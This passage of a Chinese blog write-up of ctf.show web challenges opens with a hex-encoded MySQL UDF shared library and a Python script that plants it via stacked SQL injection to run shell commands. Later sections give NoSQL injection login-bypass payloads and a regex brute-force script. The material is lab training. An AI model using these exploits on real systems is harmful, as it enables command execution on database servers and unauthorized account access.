000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#39;
codes=[]
for i in range(0,len(code),128):
    codes.append(code[i:min(i+128,len(code))])
 
#建临时表
sql=&#39;&#39;&#39;create table temp(data longblob)&#39;&#39;&#39;
payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#清空临时表
sql=&#39;&#39;&#39;delete from temp&#39;&#39;&#39;
payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#插入第一段数据
sql=&#39;&#39;&#39;insert into temp(data) values (0x&#123;&#125;)&#39;&#39;&#39;.format(codes[0])
payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#更新连接剩余数据
for k in range(1,len(codes)):
    sql=&#39;&#39;&#39;update temp set data = concat(data,0x&#123;&#125;)&#39;&#39;&#39;.format(codes[k])
    payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
    requests.get(url+payload)
 
#10.3.18-MariaDB    
#写入so文件
sql=&#39;&#39;&#39;select data from temp into dumpfile &#39;/usr/lib/mariadb/plugin/udf.so\&#39;&#39;&#39;&#39;
payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#引入自定义函数
sql=&#39;&#39;&#39;create function sys_eval returns string soname &#39;udf.so\&#39;&#39;&#39;&#39;
payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#命令执行，结果更新到界面
sql=&#39;&#39;&#39;update ctfshow_user set pass=(select sys_eval(&#39;cat /flag.her?&#39;))&#39;&#39;&#39;
payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#查看结果
r=requests.get(url[:-4]+&#39;?page=1&amp;limit=10&#39;)
print(r.text)
</code></pre>
<h1 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h1><h2 id="nosql"><a href="#nosql" class="headerlink" title="nosql"></a>nosql</h2><p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/609">NoSQL注入小笔记</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/97211">冷门知识 — NoSQL注入知多少</a></p>
<pre><code>$gt : &gt;
$lt : &lt;
$gte: &gt;=
$lte: &lt;=
$ne : !=、&lt;&gt;
$in : in
$nin: not in
$all: all 
$or:or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)
/**
* : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;
* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;
* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;
*/
</code></pre>
<pre><code>//查询age = 22的记录
db.userInfo.find(&#123;&quot;age&quot;: 22&#125;);
//相当于：select * from userInfo where age = 22;
//查询age &gt; 22的记录
db.userInfo.find(&#123;age: &#123;$gt: 22&#125;&#125;);
//相当于：select * from userInfo where age &gt; 22;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144401500.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409144401243"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144445953.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409144445953"></p>

<p>这题后端对id过滤了非数字，可能用的intval函数。这个函数在PHP特性那里出现过很多次了，利用这个特性：</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144506190.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409144506190"></p>

<pre><code>?id[]=flag
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144557902.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409144557902"></p>

<h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144722019.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409144722019"></p>

<pre><code>  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray();

//无过滤
  if(count($cursor)&gt;0)&#123;
    $ret[&#39;msg&#39;]=&#39;登陆成功&#39;;
    array_push($ret[&#39;data&#39;], $flag);
  &#125;
</code></pre>
<p>没有任何的过滤，利用<code>$ne</code>就可以了</p>
<pre><code>username[$ne]=1&amp;password[$ne]=1
</code></pre>
<p>正则也可以</p>
<pre><code>username[$regex]=.*&amp;password[$regex]=.*
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150349590.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409150349590"></p>

<h1 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150536078.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409150536078"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150527537.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409150527537"></p>

<p>这次返回的是admin 的密码</p>
<p>改成username不等于admin</p>
<pre><code>username[$ne]=admin&amp;password[$ne]=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150627591.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409150627591"></p>

<h1 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h1><pre><code>username[$ne]=admin&amp;password[$ne]=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151108797.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409151108797"></p>

<p>username既不能是admin，也不能是admin1，那就正则表达式</p>
<pre><code>username[$regex]=^[^a].*$&amp;password[$ne]=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151155741.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409151155741"></p>

<h1 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151505085.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409151505085"></p>

<pre><code>mongodb的find().pretty()方法的作用。
使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。
</code></pre>
<pre><code class="python">&quot;&quot;&quot;
Author : feng
Time : 2021-2-14
&quot;&quot;&quot;
import requests

url=&quot;http://2184e9b4-619a-43dd-b8de-015a6a74fe3d.chall.ctf.show:8080/api/&quot;

flag=&quot;&quot;

for i in range(1,100):
    for j in &quot;&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#125;&quot;:
        payload=&quot;^&#123;&#125;.*$&quot;.format(flag+j)
        data=&#123;
            &#39;username[$regex]&#39;:&#39;flag&#39;,
            &#39;password[$regex]&#39;:payload
        &#125;
        r=requests.post(url=url,data=data)
        if r&quot;\u767b\u9646\u6210\u529f&quot; in r.text:
            flag+=j
            print(flag)
            if j==&quot;&#125;&quot;:
                exit()
            break
</code></pre>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/">bfengj</a></p>
<p><a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/">Y4tacker</a></p>

	</div>

	

	

	
		<div class="post-tags">
			<i class="fa fa-tags" aria-hidden="true"></i>
			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/ctf-show/" rel="tag">ctf.show</a>
		</div>
	
</article>

	<div id="share_container">
	<div id="share" data-initialized="true">
		<a class="no-pjax icon-wechat" tooltip="分享到微信">
			<button class="btn btn-icon btn-success">
				<span class="btn-inner--icon"><i class="fa fa-weixin"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-douban" tooltip="分享到豆瓣">
			<button class="btn btn-icon btn-primary" style="background: #209261;border: none;">
				豆
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-qq" tooltip="分享到 QQ">
			<button class="btn btn-icon btn-primary" style="background: #2196f3;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-qq"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-qzone" tooltip="分享到 QQ 空间">
			<button class="btn btn-icon btn-primary" style="background: #ffc107;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-star"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-weibo" tooltip="分享到微博">
			<button class="btn btn-icon btn-warning">
				<span class="btn-inner--icon"><i class="fa fa-weibo"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-facebook" tooltip="分享到 Facebook">
			<button class="btn btn-icon btn-primary" style="background: #283593;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-facebook"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-twitter" tooltip="分享到 Twitter">
			<button class="btn btn-icon btn-primary" style="background: #03a9f4;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=https://lovewanan.github.io/ctfshow/ctf.show/sql/&text=sql" tooltip="分享到 Telegram">
			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-copy-link" id="share_copy_link" tooltip="复制链接">
			<button class="btn btn-icon btn-default">
				<span class="btn-inner--icon"><i class="fa fa-link"></i></span>
			</button>
		</a>
	</div>
	<button id="share_show" class="btn btn-icon btn-primary" tooltip="分享">
		<span class="btn-inner--icon"><i class="fa fa-share"></i></span>
	</button>
</div>
<script type="text/javascript">
	socialShare("#share", {
	    title : 'sql',
	    description : 'web171注入学习

$sql = &amp;quot;select username,password ...',
	    wechatQrcodeTitle : "分享到微信",
	    wechatQrcodeHelper : '微信扫描二维码',
	    source : 'https://lovewanan.github.io/ctfshow/ctf.show/sql/'
	});
	$("#share_show")[0].onclick = function(){
		$("#share_container").addClass("opened");
	};
	$("#share_copy_link")[0].onclick = function(){
		let input = document.createElement('input');
		document.body.appendChild(input);
		input.setAttribute("value", window.location.href);
		input.setAttribute("readonly", "readonly");
		input.setAttribute("style", "opacity: 0;mouse-events:none;");
		input.select();
		if (document.execCommand('copy')){
			iziToast.show({
				title: '链接已复制',
				message: "链接已复制到剪贴板",
				class: 'shadow',
				position: 'topRight',
				backgroundColor: '#2dce89',
				titleColor: '#ffffff',
				messageColor: '#ffffff',
				iconColor: '#ffffff',
				progressBarColor: '#ffffff',
				icon: 'fa fa-check',
				timeout: 5000
			});
		}else{
			iziToast.show({
				title: '复制失败',
				message: "请手动复制链接",
				class: 'shadow',
				position: 'topRight',
				backgroundColor: '#f5365c',
				titleColor: '#ffffff',
				messageColor: '#ffffff',
				iconColor: '#ffffff',
				progressBarColor: '#ffffff',
				icon: 'fa fa-close',
				timeout: 5000
			});
		}
		document.body.removeChild(input);
	};
</script>




	<div id="post_comment" class="card shadow-sm">
		<div id="waline"></div>
<script>
  Waline({
	el: '#waline',
	serverURL: 'https://waline-jaua9chtw-lovewanan.vercel.app',
  });
</script>

	</div>


<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/ctfshow/ctf.show/SSRF/" rel="prev"> SSRF</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/ctfshow/ctf.show/PHP%E7%89%B9%E6%80%A7/" rel="next"> PHP特性</a></div></div>




		
		
		
		

					<footer id="footer" class="site-footer card shadow-sm border-0">
						
						<div>Theme <a target="_blank" rel="noopener" href="https://github.com/solstice23/hexo-theme-argon"><strong>Argon</strong></a> | Powered by Hexo</div>
						<span id="busuanzi_container_site_uv">
							本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
						</span>
					</footer>
				</main>
			</div>
		</div>
		
<script src="/argontheme.js"></script>

		
		
		

		
			<script>
				var argonEnableCodeHighlight = true;
			</script>
			
<link rel="stylesheet" href="/assets/vendor/highlight/styles/github-gist.css">

		

	</div>
</div>
<noscript>
	<style>
		article img.lazyload[src^="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPg"]{display: none;}
		.comment-item-text .comment-sticker.lazyload{display: none;}
	</style>
</noscript>
</body>



</html>

